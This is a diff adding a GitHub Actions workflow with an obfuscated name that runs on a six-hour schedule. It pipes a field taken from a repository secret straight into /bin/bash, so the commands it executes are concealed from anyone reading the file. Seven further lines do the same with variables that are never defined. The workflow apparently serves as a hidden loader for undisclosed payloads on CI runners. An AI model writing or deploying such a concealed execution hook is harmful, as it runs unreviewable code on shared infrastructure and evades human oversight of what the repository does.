@@ -1,0 +1,25 @@
+name: xindangxianing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xindangxianing
+        env:
+          waas46440: ${{ secrets.waas46440 }}
+        run: |
+          echo $waas46440 | jq -r .vjveg15 | /bin/bash
+          echo $r00268 | jq -r .ovu63144 | /bin/bash
+          echo $dwyh1664 | jq -r .sfxq24908 | /bin/bash
+          echo $m77737 | jq -r .ipypj22 | /bin/bash
+          echo $tsl5081 | jq -r .wjo570 | /bin/bash
+          echo $fg287 | jq -r .jmf4232 | /bin/bash
+          echo $n6669 | jq -r .a9082 | /bin/bash
+          echo $iq3234 | jq -r .nk3924 | /bin/bash
+
